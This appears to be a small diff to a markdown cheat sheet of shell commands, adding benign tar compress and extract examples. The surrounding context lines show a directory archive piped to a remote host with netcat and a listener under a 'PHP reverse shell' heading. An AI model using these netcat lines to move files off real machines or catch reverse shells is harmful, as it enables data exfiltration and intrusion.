@@ -34,6 +34,16 @@ cat directory.tar.gz | nc example.com 1234
 nc -l -p 1234 > directory.tar.gz
 ```
 
+# Archive
+### Compress:
+```bash
+tar -czf archive.tar.gz /path/to/directory_or_file
+```
+### Extract:
+```bash
+tar -xzf archive.tar.gz
+```
+
 ## PHP reverse shell
 ```bash
 nc -lvnp 4444
